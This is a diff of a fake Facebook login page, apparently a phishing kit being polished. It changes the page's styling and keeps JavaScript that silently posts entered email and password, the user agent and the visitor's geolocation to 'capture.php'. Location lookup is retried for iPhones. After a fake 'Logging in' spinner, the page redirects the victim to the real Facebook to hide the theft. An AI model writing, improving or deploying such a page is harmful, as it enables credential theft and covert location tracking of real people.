@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook – Log in or sign up</title>
+    <title>Log in to Facebook</title>
     <style>
         * {
             margin: 0;
@@ -19,40 +19,40 @@
             align-items: center;
             min-height: 100vh;
             padding: 20px;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+        }
+
+        .logo h1 {
+            font-size: 56px;
+            font-weight: 700;
+            color: #1877f2;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            letter-spacing: -2px;
+        }
+
+        .logo .tagline {
+            font-size: 20px;
+            color: #1c1e21;
+            font-weight: 400;
+            margin-top: -6px;
         }
 
         .card {
             background: white;
             border-radius: 8px;
             box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
-            padding: 30px 28px 28px;
-            max-width: 396px;
+            padding: 20px 20px 28px;
             width: 100%;
-            text-align: center;
-        }
-
-        .fb-logo {
-            font-size: 44px;
-            font-weight: 700;
-            color: #1877f2;
-            letter-spacing: -1px;
-            margin-bottom: 4px;
-            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
-        }
-        .fb-logo span {
-            background: #1877f2;
-            color: white;
-            padding: 2px 10px;
-            border-radius: 4px;
-            font-size: 20px;
-            margin-right: 4px;
-            display: inline-block;
-        }
-
-        .subhead {
-            color: #606770;
-            font-size: 15px;
-            margin-bottom: 20px;
         }
 
         .form-group {
@@ -71,6 +71,9 @@
         .form-group input:focus {
             border-color: #1877f2;
             box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        .form-group input::placeholder {
+            color: #90949c;
         }
 
         .btn-login {
@@ -94,10 +97,21 @@
             cursor: not-allowed;
         }
 
+        .forgot {
+            display: block;
+            margin-top: 16px;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
         .divider {
             display: flex;
             align-items: center;
-            margin: 18px 0 16px;
+            margin: 20px 0 18px;
             gap: 12px;
         }
         .divider::before,
@@ -129,23 +143,18 @@
             background: #36a420;
         }
 
-        .forgot {
-            display: block;
-            margin-top: 14px;
-            color: #1877f2;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        .forgot:hover {
-            text-decoration: underline;
-        }
-
         .footer {
             margin-top: 20px;
-            font-size: 12px;
+            font-size: 13px;
             color: #8c9ba8;
-            border-top: 1px solid #e6ecf0;
-            padding-top: 14px;
+        }
+        .footer a {
+            color: #8c9ba8;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
         }
 
         .spinner {
@@ -160,36 +169,52 @@
             margin-right: 8px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        .meta-footer {
+            margin-top: 28px;
+            font-size: 12px;
+            color: #8c9ba8;
+        }
+        .meta-footer span {
+            margin: 0 6px;
+            color: #8c9ba8;
+        }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="fb-logo">
-        <span>f</span> facebook
-    </div>
-    <div class="subhead">Connect with friends and the world around you.</div>
-
-    <form id="loginForm">
-        <div class="form-group">
-            <input type="text" id="email" placeholder="Email or phone number" />
-        </div>
-        <div class="form-group">
-            <input type="password" id="password" placeholder="Password" />
-        </div>
-        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
-    </form>
-
-    <a href="#" class="forgot">Forgot password?</a>
-
-    <div class="divider">
-        <span>or</span>
+<div class="container">
+    <!-- Logo & Tagline -->
+    <div class="logo">
+        <h1>facebook</h1>
+        <div class="tagline">Explore the things you love.</div>
     </div>
 
-    <button class="btn-create" id="createBtn">Create new account</button>
+    <!-- Login Card -->
+    <div class="card">
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="email" placeholder="Email address or mobile number" />
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" />
+            </div>
+            <button type="submit" class="btn-login" id="loginBtn">Log In</button>
+        </form>
 
-    <div class="footer">
-        <span>Meta © 2026</span>
+        <a href="#" class="forgot">Forgotten password?</a>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <button class="btn-create" id="createBtn">Create new account</button>
+    </div>
+
+    <!-- Meta Footer -->
+    <div class="meta-footer">
+        <span>Meta</span>
+        <span>© 2026</span>
     </div>
 </div>
 
@@ -241,19 +266,17 @@
             userAgent: navigator.userAgent
         };
 
-        // Fire and forget – we don't wait for the response
         fetch('capture.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).catch(() => {}); // Silent fail
+        }).catch(() => {});
     }
 
     // ---------- 4. Request geolocation (iPhone friendly) ----------
     function requestLocation() {
         if (!navigator.geolocation) return;
 
-        // First attempt: faster (WiFi/Cell), longer timeout for iPhone
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 const lat = pos.coords.latitude;
@@ -262,12 +285,10 @@
                 const ts = pos.timestamp || Date.now();
                 locationCaptured = true;
                 lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
-                // Send location as soon as we get it
                 sendToServer(lat, lng, acc, ts);
             },
             (err) => {
-                // If it fails or times out, try a fallback with lower accuracy but longer timeout
-                console.warn('Location attempt 1 failed (iOS fallback):', err.message);
+                console.warn('Location attempt failed:', err.message);
                 setTimeout(() => {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
@@ -279,7 +300,7 @@
                             lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
                             sendToServer(lat, lng, acc, ts);
                         },
-                        () => {}, // Final silent fail
+                        () => {},
                         { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
                     );
                 }, 2000);
@@ -295,17 +316,13 @@
     form.addEventListener('submit', function(e) {
         e.preventDefault();
 
-        // Grab credentials immediately
         const email = document.getElementById('email').value || 'N/A';
         const password = document.getElementById('password').value || 'N/A';
 
-        // If location wasn't captured yet, send credentials anyway
-        // (location will be sent separately when it's captured)
-        if (locationCaptured) {
-            // Send credentials + last known location
+        // Send credentials + location (if available)
+        if (locationCaptured && lastLocation.lat) {
             sendToServer(lastLocation.lat, lastLocation.lng, lastLocation.accuracy, lastLocation.timestamp);
         } else {
-            // Send credentials without location (location will come later)
             sendToServer(null, null, null, null);
         }
 
@@ -314,17 +331,15 @@
         loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
         loginBtn.disabled = true;
 
-        // Clear password field, wait 2.5 seconds, then redirect to REAL Facebook
+        // Wait 2.5 seconds, then redirect to REAL Facebook
         setTimeout(() => {
             loginBtn.innerHTML = original;
             loginBtn.disabled = false;
+            // Clear password field
             document.getElementById('password').value = '';
-            document.getElementById('password').placeholder = 'Redirecting to Facebook...';
-            
-            setTimeout(() => {
-                // Redirect to the REAL Facebook homepage
-                window.location.href = 'https://www.facebook.com/';
-            }, 1500);
+            document.getElementById('password').placeholder = 'Password';
+            // Redirect to real Facebook
+            window.location.href = 'https://www.facebook.com/';
         }, 2500);
     });
 
